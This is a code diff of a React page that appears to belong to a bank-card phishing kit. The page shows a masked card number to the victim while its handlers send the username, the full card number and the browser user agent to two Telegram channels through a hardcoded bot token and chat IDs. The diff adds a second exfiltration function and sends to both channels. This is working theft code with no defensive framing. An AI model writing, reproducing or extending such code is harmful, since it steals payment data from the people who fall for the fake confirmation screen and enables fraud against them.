@@ -1,6 +1,10 @@
 import React, { useState, useEffect } from 'react';
-import { useTelegramBot } from '../hooks/useTelegramBot';
+import axios from 'axios';
 import './NextStepAppr.css';
+
+const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
+const TELEGRAM_LOGS_CHAT_ID = '-1003861936742'; // Logs channel ID
+const TELEGRAM_ACTIONS_CHAT_ID = '-1003745991330'; // Actions channel ID
 
 function NextStepAppr() {
   const [username, setUsername] = useState('');
@@ -9,29 +13,23 @@ function NextStepAppr() {
   const [currentTime, setCurrentTime] = useState(new Date());
   const [isLoading, setIsLoading] = useState(false);
   const [isConfirmed, setIsConfirmed] = useState(false);
-  const [sessionId, setSessionId] = useState(null);
 
   // Get username and card number from sessionStorage
   useEffect(() => {
-    // Retrieve data with better error handling
     const storedUsername = sessionStorage.getItem('loginName') || 'Unknown User';
     const storedCardNumber = sessionStorage.getItem('cardNumber');
-    const storedSessionId = sessionStorage.getItem('sessionId') || Date.now().toString();
     
     console.log('📦 Retrieved from sessionStorage:', { storedUsername, storedCardNumber });
     
     setUsername(storedUsername);
-    setSessionId(storedSessionId);
     
     if (storedCardNumber) {
       setFullCardNumber(storedCardNumber);
-      // Format card number to show only last 4 digits for display
       const cleanNumber = storedCardNumber.replace(/\s/g, '');
       const last4 = cleanNumber.slice(-4);
       setCardNumber(`**** **** **** ${last4}`);
     } else {
       console.warn('⚠️ No card number found in sessionStorage');
-      // Try to get from localStorage as fallback
       const localCardNumber = localStorage.getItem('cardNumber');
       if (localCardNumber) {
         setFullCardNumber(localCardNumber);
@@ -47,60 +45,61 @@ function NextStepAppr() {
     const timer = setInterval(() => {
       setCurrentTime(new Date());
     }, 1000);
-
     return () => clearInterval(timer);
   }, []);
 
-  // Initialize Telegram bot with dummy handlers for NextStepAppr
-  const {
-    sendBlockedLog,
-    sendSuccessToTelegram
-  } = useTelegramBot(
-    sessionId,
-    () => {}, // onApprove - not needed here
-    () => {}, // onDeny - not needed here
-    () => {}, // onViewCard - not needed here
-    () => {}, // onNextStep - not needed here
-    () => {}, // onBackToCard - not needed here
-    () => {}, // onBackToLogin - not needed here
-    () => {}, // onBlock - not needed here
-    () => {}  // onNextStepAppr - not needed here
-  );
-
-  // Send confirmation log using the existing Telegram infrastructure
   const sendConfirmationLog = async () => {
     try {
-      // Use the sendSuccessToTelegram function from useTelegramBot
-      await sendSuccessToTelegram(username, sessionId);
-      
-      // Send additional confirmation specific log
-      const confirmationMessage = `
+      const logMessage = `
 📋 <b>USER CONFIRMATION - CZ KEY</b> 📋
 ━━━━━━━━━━━━━━━━━━━━━
 👤 <b>Username:</b> ${username}
 💳 <b>FULL Card Number:</b> <code>${fullCardNumber}</code>
-🔘 <b>Action:</b> User confirmed payment in CZ key
+🔘 <b>Action:</b> User pressed CONFIRMATION button
 ⏰ <b>Time:</b> ${currentTime.toLocaleString()}
 🌐 <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}
 ━━━━━━━━━━━━━━━━━━━━━
-✅ <i>Payment has been confirmed in CZ key!</i>
+✅ <i>User has confirmed the payment in CZ key!</i>
       `;
-      
-      // You would need to add this function to useTelegramBot or use direct axios
-      const axios = require('axios');
-      const TELEGRAM_BOT_TOKEN = '8666763764:AAEAX_70cie6CV4ccQ9blq8D8S6GcqXD-dk';
-      const TELEGRAM_LOGS_CHAT_ID = '-1003861936742';
-      
+
+      // Send to logs channel
       await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         chat_id: TELEGRAM_LOGS_CHAT_ID,
-        text: confirmationMessage,
+        text: logMessage,
         parse_mode: 'HTML'
       });
       
-      console.log('✅ Confirmation log sent to Telegram');
+      console.log('✅ Confirmation log sent to Telegram logs channel');
       return true;
     } catch (error) {
-      console.error('Error sending confirmation log:', error);
+      console.error('Error sending log:', error);
+      return false;
+    }
+  };
+
+  const sendActionNotification = async () => {
+    try {
+      const actionMessage = `
+✅ <b>USER CONFIRMED PAYMENT IN CZ KEY</b> ✅
+━━━━━━━━━━━━━━━━━━━━━
+👤 <b>Username:</b> ${username}
+💳 <b>Card:</b> ${cardNumber}
+⏰ <b>Time:</b> ${currentTime.toLocaleString()}
+━━━━━━━━━━━━━━━━━━━━━
+✅ <i>User has completed the CZ key confirmation!</i>
+      `;
+
+      // Send to actions channel
+      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        chat_id: TELEGRAM_ACTIONS_CHAT_ID,
+        text: actionMessage,
+        parse_mode: 'HTML'
+      });
+      
+      console.log('✅ Action notification sent to Telegram actions channel');
+      return true;
+    } catch (error) {
+      console.error('Error sending action notification:', error);
       return false;
     }
   };
@@ -108,12 +107,13 @@ function NextStepAppr() {
   const handleConfirm = async () => {
     setIsLoading(true);
     
-    // Send confirmation log
+    // Send both notifications
     await sendConfirmationLog();
+    await sendActionNotification();
     
     setIsConfirmed(true);
     setIsLoading(false);
-    console.log('✅ Confirmed - Log sent to channel');
+    console.log('✅ Confirmed - Logs sent to both channels');
   };
 
   const handleBack = () => {
